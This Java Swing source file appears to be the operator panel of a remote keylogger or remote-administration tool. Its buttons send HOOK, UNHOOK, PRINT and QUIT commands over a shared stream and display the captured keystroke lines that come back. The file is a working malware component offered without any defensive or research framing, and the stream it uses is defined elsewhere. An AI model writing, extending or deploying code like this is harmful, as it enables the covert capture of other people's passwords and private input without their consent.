package org.example;

import javax.swing.*;
import java.awt.event.*;
import java.io.IOException;

public class Keylog extends JDialog {
    private JPanel contentPane;
    private JButton hookButton;
    private JButton unhookButton;
    private JButton printKeyButton;
    private JButton clearViewButton;
    private JTextArea textArea1;

    public Keylog() {
        InitializePicComponent();
    }

    public void InitializePicComponent() {
        setContentPane(contentPane);
        setModal(true);
        getRootPane().setDefaultButton(hookButton);
        textArea1.setEditable(false);
        unhookButton.setEnabled(false);
        this.pack();
        this.setTitle("Keystroke Form");

        hookButton.addActionListener(e -> hookButtonClick());

        unhookButton.addActionListener(e -> unhookButtonClick());
        clearViewButton.addActionListener(e -> clearViewButtonClick());
        printKeyButton.addActionListener(e -> printKeyButtonClick());

        // call onCancel() when cross is clicked
        setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
        addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent e) {
                onCancel();
            }
        });

        // call onCancel() on ESCAPE
        contentPane.registerKeyboardAction(e -> onCancel(), KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), JComponent.WHEN_ANCESTOR_OF_FOCUSED_COMPONENT);
    }

    private void hookButtonClick() {
        String s = "HOOK";
        hookButton.setEnabled(false);
        unhookButton.setEnabled(true);
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();


        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private void unhookButtonClick() {
        String s = "UNHOOK";
        unhookButton.setEnabled(false);
        hookButton.setEnabled(true);
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();


        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private void clearViewButtonClick() {
        textArea1.setText("");
    }

    private void printKeyButtonClick() {
        String s = "PRINT";
        textArea1.setText("");
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();
            String line = "";
            while (!line.equals("[END_OF_STRING_BUFFER]"))
            {
                line = Program.nr.readLine();
                if (!line.equals("[END_OF_STRING_BUFFER]")) {
                    textArea1.append(line);
                    textArea1.append("\n");
                }
            }
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private void onCancel() {
        String s = "QUIT";
        try {
            Program.nw.write(s);
            Program.nw.newLine();
            Program.nw.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        dispose();
    }
}
